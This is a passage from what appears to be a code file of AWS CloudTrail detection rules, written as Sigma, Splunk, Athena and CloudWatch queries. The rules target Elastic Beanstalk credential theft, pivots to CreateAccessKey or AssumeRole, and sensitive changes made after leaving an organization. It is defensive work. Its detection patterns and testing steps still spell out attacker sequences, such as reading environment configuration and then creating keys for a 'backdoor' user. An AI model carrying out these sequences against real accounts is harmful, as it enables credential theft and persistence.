| eval actor=coalesce(userIdentity.arn, userIdentity.accountId)
| eval key=acct."##".actor
| eval is_leave=if(eventSource="organizations.amazonaws.com" AND eventName="LeaveOrganization", 1, 0)
| eval is_sensitive=if(eventName IN ("PutUserPolicy","AttachRolePolicy","PutRolePolicy","CreateAccessKey","PutKeyPolicy","UpdateTrail","StopLogging"), 1, 0)
| transaction key maxspan=1h
| where mvcount(mvfilter(is_leave=1))>0 AND mvcount(mvfilter(is_sensitive=1))>0
| table _time, key, actor, eventName`,
      cloudtrail: `WITH leave_evt AS (
  SELECT recipientAccountId AS acct, userIdentity.arn AS actor, eventTime AS leave_time
  FROM cloudtrail_logs
  WHERE eventSource = 'organizations.amazonaws.com'
    AND eventName = 'LeaveOrganization'
),
sensitive_evt AS (
  SELECT userIdentity.accountId AS acct, userIdentity.arn AS actor, eventTime AS sus_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('PutUserPolicy', 'AttachRolePolicy', 'PutRolePolicy', 'CreateAccessKey', 'PutKeyPolicy', 'UpdateTrail', 'StopLogging')
)
SELECT l.acct, l.actor, l.leave_time, s.sus_time, s.eventName
FROM leave_evt l
JOIN sensitive_evt s ON l.acct = s.acct
  AND s.sus_time > l.leave_time
  AND s.sus_time <= l.leave_time + INTERVAL '1' HOUR
ORDER BY l.leave_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, userIdentity.accountId, eventName, eventSource, recipientAccountId
| filter (eventSource = "organizations.amazonaws.com" and eventName = "LeaveOrganization")
  or eventName in ["PutUserPolicy", "AttachRolePolicy", "PutRolePolicy", "CreateAccessKey", "PutKeyPolicy", "UpdateTrail", "StopLogging"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.accountId, userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.organizations"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["organizations.amazonaws.com"], eventName: ["LeaveOrganization"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "organizations.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "recipientAccountId", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "organizations.amazonaws.com", eventName: "LeaveOrganization", userIdentity: { type: "Root", accountId: "123456789012" }, recipientAccountId: "123456789012", sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify LeaveOrganization and follow-on activity.", "Verify if sensitive actions were previously SCP-blocked.", "Check for IAM/KMS/CloudTrail changes."],
    testingSteps: ["Leave org, then perform CreateAccessKey within 1h.", "Run Splunk or Athena correlation query."],
  },

  // --- Beanstalk Credential Pivot ---
  {
    id: "det-118",
    title: "CreateAccessKey or AssumeRole by Beanstalk-Linked Principal",
    description: "Baseline visibility when a principal associated with Beanstalk pivots into stronger access paths. Stronger than generic CreateAccessKey because tied to a Beanstalk credential source.",
    awsService: "IAM",
    relatedServices: ["Elastic Beanstalk", "STS"],
    severity: "High",
    tags: ["Elastic Beanstalk", "IAM", "Credential Pivot"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate Beanstalk role usage", "Expected CI/CD"],
    rules: {
      sigma: `title: CreateAccessKey or AssumeRole by Beanstalk-Linked Principal
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_iam:
    eventSource: iam.amazonaws.com
    eventName: CreateAccessKey
  selection_sts:
    eventSource: sts.amazonaws.com
    eventName: AssumeRole
  filter_beanstalk:
    userIdentity.arn|contains:
      - 'elasticbeanstalk'
      - 'Beanstalk'
      - 'aws-elasticbeanstalk'
  condition: (selection_iam or selection_sts) and filter_beanstalk
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail ((eventSource=iam.amazonaws.com AND eventName=CreateAccessKey) OR (eventSource=sts.amazonaws.com AND eventName=AssumeRole))
| where like(userIdentity.arn, "%elasticbeanstalk%") OR like(userIdentity.arn, "%Beanstalk%") OR like(userIdentity.arn, "%aws-elasticbeanstalk%") OR like(userIdentity.sessionContext.sessionIssuer.arn, "%elasticbeanstalk%")
| table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn, sourceIPAddress
FROM cloudtrail_logs
WHERE ((eventSource = 'iam.amazonaws.com' AND eventName = 'CreateAccessKey') OR (eventSource = 'sts.amazonaws.com' AND eventName = 'AssumeRole'))
  AND (userIdentity.arn LIKE '%elasticbeanstalk%' OR userIdentity.arn LIKE '%Beanstalk%' OR userIdentity.arn LIKE '%aws-elasticbeanstalk%' OR userIdentity.sessionContext.sessionIssuer.arn LIKE '%elasticbeanstalk%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn
| filter (eventSource = "iam.amazonaws.com" and eventName = "CreateAccessKey") or (eventSource = "sts.amazonaws.com" and eventName = "AssumeRole")
| filter userIdentity.arn like /elasticbeanstalk|Beanstalk|aws-elasticbeanstalk/ or userIdentity.sessionContext.sessionIssuer.arn like /elasticbeanstalk/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam", "aws.sts"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateAccessKey", "AssumeRole"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.sessionContext.sessionIssuer.arn", "requestParameters.userName", "requestParameters.roleArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateAccessKey", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session" }, requestParameters: { userName: "backdoor" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the Beanstalk-linked principal.", "Verify if CreateAccessKey/AssumeRole was expected.", "Check for prior DescribeConfigurationSettings."],
    testingSteps: ["As Beanstalk instance role, call CreateAccessKey.", "Verify detection triggers."],
  },
  {
    id: "det-119",
    title: "Beanstalk Recon Followed by Credential Pivot",
    description: "High-confidence credential-pivot: DescribeConfigurationSettings then within short window same actor performs CreateAccessKey, AssumeRole, AttachUserPolicy, PutUserPolicy, or AttachRolePolicy. Models the full path: read env config, extract credentials, pivot.",
    awsService: "Elastic Beanstalk",
    relatedServices: ["IAM", "STS"],
    severity: "Critical",
    tags: ["Elastic Beanstalk", "Credential Pivot", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate config read followed by IAM admin"],
    rules: {
      sigma: `title: Beanstalk Recon Followed by Credential Pivot
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_beanstalk:
    eventSource: elasticbeanstalk.amazonaws.com
    eventName: DescribeConfigurationSettings
  selection_pivot:
    eventName:
      - CreateAccessKey
      - AssumeRole
      - AttachUserPolicy
      - PutUserPolicy
      - AttachRolePolicy
  condition: 1 of selection_*
level: critical
# Full correlation (actor, 30 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=elasticbeanstalk.amazonaws.com AND eventName=DescribeConfigurationSettings) OR (eventName=CreateAccessKey OR eventName=AssumeRole OR eventName=AttachUserPolicy OR eventName=PutUserPolicy OR eventName=AttachRolePolicy))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_recon=if(eventSource="elasticbeanstalk.amazonaws.com" AND eventName="DescribeConfigurationSettings", 1, 0)
| eval is_pivot=if(eventName IN ("CreateAccessKey","AssumeRole","AttachUserPolicy","PutUserPolicy","AttachRolePolicy"), 1, 0)
| transaction actor maxspan=30m
| where mvcount(mvfilter(is_recon=1))>0 AND mvcount(mvfilter(is_pivot=1))>0
| table _time, actor, eventName, requestParameters.applicationName, requestParameters.environmentName`,
      cloudtrail: `WITH recon_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS recon_time
  FROM cloudtrail_logs
  WHERE eventSource = 'elasticbeanstalk.amazonaws.com'
    AND eventName = 'DescribeConfigurationSettings'
),
pivot_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS pivot_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('CreateAccessKey', 'AssumeRole', 'AttachUserPolicy', 'PutUserPolicy', 'AttachRolePolicy')
)
SELECT r.actor, r.recon_time, p.pivot_time, p.eventName
FROM recon_evt r
JOIN pivot_evt p ON r.actor = p.actor
  AND p.pivot_time > r.recon_time
  AND p.pivot_time <= r.recon_time + INTERVAL '30' MINUTE
ORDER BY r.recon_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.applicationName
| filter (eventSource = "elasticbeanstalk.amazonaws.com" and eventName = "DescribeConfigurationSettings")
  or eventName in ["CreateAccessKey", "AssumeRole", "AttachUserPolicy", "PutUserPolicy", "AttachRolePolicy"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.elasticbeanstalk"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["elasticbeanstalk.amazonaws.com"], eventName: ["DescribeConfigurationSettings"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { applicationName: "my-app", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify DescribeConfigurationSettings and pivot sequence.", "Verify if pivot was authorized.", "Check for credential exfiltration from env config."],
    testingSteps: ["Call DescribeConfigurationSettings, then CreateAccessKey within 30 min.", "Run Splunk or Athena correlation query."],
  },
  {
    id: "det-120",
    title: "CreateAccessKey for Suspicious Target After Beanstalk Access",
    description: "Detects likely persistence after Beanstalk credential theft: DescribeConfigurationSettings or other Beanstalk recon then CreateAccessKey for a suspicious or high-value user.",
    awsService: "IAM",
    relatedServices: ["Elastic Beanstalk"],
    severity: "Critical",
    tags: ["Elastic Beanstalk", "IAM", "Credential Pivot"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Expected IAM admin automation"],
    rules: {
      sigma: `title: CreateAccessKey for Suspicious Target After Beanstalk Access
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_beanstalk:
    eventSource: elasticbeanstalk.amazonaws.com
    eventName: DescribeConfigurationSettings
  selection_createkey:
    eventSource: iam.amazonaws.com
    eventName: CreateAccessKey
  filter_suspicious:
    requestParameters.userName|contains:
      - 'backdoor'
      - 'admin'
      - 'breakglass'
  condition: (selection_beanstalk or selection_createkey) and filter_suspicious
level: critical
# Full correlation (actor, 30 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=elasticbeanstalk.amazonaws.com AND eventName=DescribeConfigurationSettings) OR (eventSource=iam.amazonaws.com AND eventName=CreateAccessKey))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_beanstalk=if(eventSource="elasticbeanstalk.amazonaws.com" AND eventName="DescribeConfigurationSettings", 1, 0)
| eval is_createkey=if(eventSource="iam.amazonaws.com" AND eventName="CreateAccessKey" AND (like(requestParameters.userName, "%backdoor%") OR like(requestParameters.userName, "%admin%") OR like(requestParameters.userName, "%breakglass%")), 1, 0)
| transaction actor maxspan=30m
| where mvcount(mvfilter(is_beanstalk=1))>0 AND mvcount(mvfilter(is_createkey=1))>0
| table _time, actor, eventName, requestParameters.userName`,
      cloudtrail: `WITH beanstalk_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS recon_time
  FROM cloudtrail_logs
  WHERE eventSource = 'elasticbeanstalk.amazonaws.com'
    AND eventName = 'DescribeConfigurationSettings'
),
createkey_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS key_time, requestParameters.userName
  FROM cloudtrail_logs
  WHERE eventSource = 'iam.amazonaws.com'
    AND eventName = 'CreateAccessKey'
    AND (requestParameters.userName LIKE '%backdoor%' OR requestParameters.userName LIKE '%admin%' OR requestParameters.userName LIKE '%breakglass%')
)
SELECT b.actor, b.recon_time, c.key_time, c.userName
FROM beanstalk_evt b
JOIN createkey_evt c ON b.actor = c.actor
  AND c.key_time > b.recon_time
  AND c.key_time <= b.recon_time + INTERVAL '30' MINUTE
ORDER BY b.recon_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.userName
| filter (eventSource = "elasticbeanstalk.amazonaws.com" and eventName = "DescribeConfigurationSettings")
  or (eventSource = "iam.amazonaws.com" and eventName = "CreateAccessKey" and (requestParameters.userName like /backdoor|admin|breakglass/))
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["iam.amazonaws.com"], eventName: ["CreateAccessKey"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.userName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateAccessKey", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session" }, requestParameters: { userName: "backdoor" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify Beanstalk recon and CreateAccessKey sequence.", "Verify if target user was authorized.", "Check for stolen credentials from env."],
    testingSteps: ["DescribeConfigurationSettings, then CreateAccessKey for backdoor user.", "Run correlation query."],
  },
  {
    id: "det-121",
    title: "Unexpected Actor Uses Beanstalk-Derived Privileges",
    description: "Detects post-Beanstalk pivot by identities that normally should not interact with IAM/STS this way. Suspicious: application role or Beanstalk instance role performing CreateAccessKey, AssumeRole, or privileged follow-on actions.",
    awsService: "IAM",
    relatedServices: ["Elastic Beanstalk", "STS"],
    severity: "High",
    tags: ["Elastic Beanstalk", "IAM", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known Beanstalk roles with IAM admin", "Platform automation"],
    rules: {
      sigma: `title: Unexpected Actor Uses Beanstalk-Derived Privileges
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource:
      - iam.amazonaws.com
      - sts.amazonaws.com
    eventName:
      - CreateAccessKey
      - AssumeRole
  filter_beanstalk:
    userIdentity.arn|contains:
      - 'elasticbeanstalk'
      - 'aws-elasticbeanstalk'
  filter_known:
    userIdentity.arn|contains:
      - '/role/Admin'
      - '/role/Platform'
  condition: selection and filter_beanstalk and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail ((eventSource=iam.amazonaws.com AND eventName=CreateAccessKey) OR (eventSource=sts.amazonaws.com AND eventName=AssumeRole))
| where (like(userIdentity.arn, "%elasticbeanstalk%") OR like(userIdentity.arn, "%aws-elasticbeanstalk%")) AND NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn, sourceIPAddress
FROM cloudtrail_logs
WHERE ((eventSource = 'iam.amazonaws.com' AND eventName = 'CreateAccessKey') OR (eventSource = 'sts.amazonaws.com' AND eventName = 'AssumeRole'))
  AND (userIdentity.arn LIKE '%elasticbeanstalk%' OR userIdentity.arn LIKE '%aws-elasticbeanstalk%')
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.userName, requestParameters.roleArn
| filter (eventSource = "iam.amazonaws.com" and eventName = "CreateAccessKey") or (eventSource = "sts.amazonaws.com" and eventName = "AssumeRole")
| filter (userIdentity.arn like /elasticbeanstalk|aws-elasticbeanstalk/) and userIdentity.arn not like /\\/role\\/(Admin|Platform)/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.iam", "aws.sts"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["CreateAccessKey", "AssumeRole"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "iam.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.userName", "requestParameters.roleArn", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "iam.amazonaws.com", eventName: "CreateAccessKey", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/aws-elasticbeanstalk-ec2-role/session" }, requestParameters: { userName: "backdoor" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the Beanstalk-linked actor.", "Verify if IAM/STS use was expected.", "Update allowlist if legitimate."],
    testingSteps: ["As Beanstalk instance role (non-admin), call CreateAccessKey.", "Verify detection triggers."],
  },

  // --- Elastic Beanstalk Environment Credential Theft ---
  {
    id: "det-122",
    title: "DescribeConfigurationSettings Visibility",
    description: "Baseline visibility for environment configuration retrieval. This can be legitimate read-only administration, but it is a sensitive recon API because config may contain secrets or secret references.",
    awsService: "Elastic Beanstalk",
    relatedServices: ["IAM"],
    severity: "Medium",
    tags: ["Elastic Beanstalk", "Credential Theft", "Reconnaissance"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate app/platform admin", "Deployment automation"],
    rules: {
      sigma: `title: Beanstalk DescribeConfigurationSettings Visibility
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: elasticbeanstalk.amazonaws.com
    eventName: DescribeConfigurationSettings
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=elasticbeanstalk.amazonaws.com eventName=DescribeConfigurationSettings
| table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.applicationName, requestParameters.environmentName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.applicationName, requestParameters.environmentName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'elasticbeanstalk.amazonaws.com'
  AND eventName = 'DescribeConfigurationSettings'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.applicationName, requestParameters.environmentName, sourceIPAddress
| filter eventSource = "elasticbeanstalk.amazonaws.com"
| filter eventName = "DescribeConfigurationSettings"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.elasticbeanstalk"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["elasticbeanstalk.amazonaws.com"], eventName: ["DescribeConfigurationSettings"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { applicationName: "my-app", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and target app/environment.", "Verify if config read was authorized.", "Check for follow-on credential use."],
    testingSteps: ["Call DescribeConfigurationSettings.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-123",
    title: "DescribeConfigurationSettings by Unexpected Actor",
    description: "Detects sensitive configuration reads by identities that normally should not inspect Beanstalk environment settings. Suspicious: IAM users outside app/platform admin, application roles without Beanstalk admin, unusual assumed roles.",
    awsService: "Elastic Beanstalk",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["Elastic Beanstalk", "Credential Theft", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known Beanstalk/platform admin", "Deployment automation"],
    rules: {
      sigma: `title: DescribeConfigurationSettings by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: elasticbeanstalk.amazonaws.com
    eventName: DescribeConfigurationSettings
  filter_known:
    userIdentity.arn|contains:
      - '/role/Admin'
      - '/role/Platform'
      - '/role/Beanstalk'
      - '/role/App'
  condition: selection and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=elasticbeanstalk.amazonaws.com eventName=DescribeConfigurationSettings
| where NOT (like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Beanstalk%") OR like(userIdentity.arn, "%/role/App%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.applicationName, requestParameters.environmentName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.applicationName, requestParameters.environmentName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'elasticbeanstalk.amazonaws.com'
  AND eventName = 'DescribeConfigurationSettings'
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
  AND userIdentity.arn NOT LIKE '%/role/Beanstalk%'
  AND userIdentity.arn NOT LIKE '%/role/App%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.applicationName, requestParameters.environmentName
| filter eventSource = "elasticbeanstalk.amazonaws.com"
| filter eventName = "DescribeConfigurationSettings"
| filter userIdentity.arn not like /\\/role\\/(Admin|Platform|Beanstalk|App)/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.elasticbeanstalk"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["elasticbeanstalk.amazonaws.com"], eventName: ["DescribeConfigurationSettings"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { applicationName: "my-app", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for Beanstalk config.", "Update allowlist if legitimate."],
    testingSteps: ["As non-Beanstalk role, call DescribeConfigurationSettings.", "Verify detection triggers."],
  },
  {
    id: "det-124",
    title: "Burst or Broad Environment Enumeration",
    description: "Detects reconnaissance across multiple applications/environments. Repeated DescribeConfigurationSettings by same actor across many app/environment names in a short period. Legitimate use is often narrow; attackers tend to enumerate broadly.",
    awsService: "Elastic Beanstalk",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["Elastic Beanstalk", "Credential Theft", "Burst"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate multi-env admin", "Deployment across envs"],
    rules: {
      sigma: `title: Burst Beanstalk Environment Enumeration
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: elasticbeanstalk.amazonaws.com
    eventName: DescribeConfigurationSettings
  condition: selection
level: high
# Threshold: >5 distinct app+env in 15 min. Implement in SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=elasticbeanstalk.amazonaws.com eventName=DescribeConfigurationSettings
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval key=requestParameters.applicationName."##".requestParameters.environmentName
| transaction actor maxspan=15m
| eval distinct_envs=mvcount(mvdedup(split(key, "##")))
| where distinct_envs > 5
| table _time, actor, distinct_envs, key`,
      cloudtrail: `SELECT userIdentity.arn AS actor, COUNT(DISTINCT requestParameters.applicationName || '##' || COALESCE(requestParameters.environmentName, '')) AS distinct_envs
FROM cloudtrail_logs
WHERE eventSource = 'elasticbeanstalk.amazonaws.com'
  AND eventName = 'DescribeConfigurationSettings'
GROUP BY userIdentity.arn
HAVING COUNT(DISTINCT requestParameters.applicationName || '##' || COALESCE(requestParameters.environmentName, '')) > 5
ORDER BY distinct_envs DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.applicationName, requestParameters.environmentName
| filter eventSource = "elasticbeanstalk.amazonaws.com"
| filter eventName = "DescribeConfigurationSettings"
| stats count(*) as cnt, count_distinct(strcat(requestParameters.applicationName, requestParameters.environmentName)) as distinct_envs by userIdentity.arn
| filter distinct_envs > 5
| sort distinct_envs desc`,
      eventbridge: JSON.stringify({ source: ["aws.elasticbeanstalk"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["elasticbeanstalk.amazonaws.com"], eventName: ["DescribeConfigurationSettings"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.applicationName", "requestParameters.environmentName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/attacker" }, requestParameters: { applicationName: "app1", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and enumeration scope.", "Verify if broad enumeration was authorized.", "Check for follow-on credential use."],
    testingSteps: ["Call DescribeConfigurationSettings for >5 distinct app+env in 15 min.", "Run threshold query."],
  },
  {
    id: "det-125",
    title: "DescribeConfigurationSettings Followed by Privileged Use",
    description: "High-confidence credential-theft: DescribeConfigurationSettings then shortly afterward same actor or newly activated principal performs CreateAccessKey, AssumeRole, GetSecretValue, S3 or KMS access beyond baseline.",
    awsService: "Elastic Beanstalk",
    relatedServices: ["IAM", "STS", "Secrets Manager", "S3", "KMS"],
    severity: "Critical",
    tags: ["Elastic Beanstalk", "Credential Theft", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate config read followed by expected API use"],
    rules: {
      sigma: `title: DescribeConfigurationSettings Followed by Privileged Use
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_beanstalk:
    eventSource: elasticbeanstalk.amazonaws.com
    eventName: DescribeConfigurationSettings
  selection_privileged:
    eventName:
      - CreateAccessKey
      - AssumeRole
      - GetSecretValue
      - Decrypt
  condition: 1 of selection_*
level: critical
# Full correlation (actor, 30 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=elasticbeanstalk.amazonaws.com AND eventName=DescribeConfigurationSettings) OR (eventName=CreateAccessKey OR eventName=AssumeRole OR eventName=GetSecretValue OR eventName=Decrypt))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_recon=if(eventSource="elasticbeanstalk.amazonaws.com" AND eventName="DescribeConfigurationSettings", 1, 0)
| eval is_privileged=if(eventName IN ("CreateAccessKey","AssumeRole","GetSecretValue","Decrypt"), 1, 0)
| transaction actor maxspan=30m
| where mvcount(mvfilter(is_recon=1))>0 AND mvcount(mvfilter(is_privileged=1))>0
| table _time, actor, eventName, requestParameters.applicationName`,
      cloudtrail: `WITH recon_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS recon_time
  FROM cloudtrail_logs
  WHERE eventSource = 'elasticbeanstalk.amazonaws.com'
    AND eventName = 'DescribeConfigurationSettings'
),
privileged_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('CreateAccessKey', 'AssumeRole', 'GetSecretValue', 'Decrypt')
)
SELECT r.actor, r.recon_time, p.use_time, p.eventName
FROM recon_evt r
JOIN privileged_evt p ON r.actor = p.actor
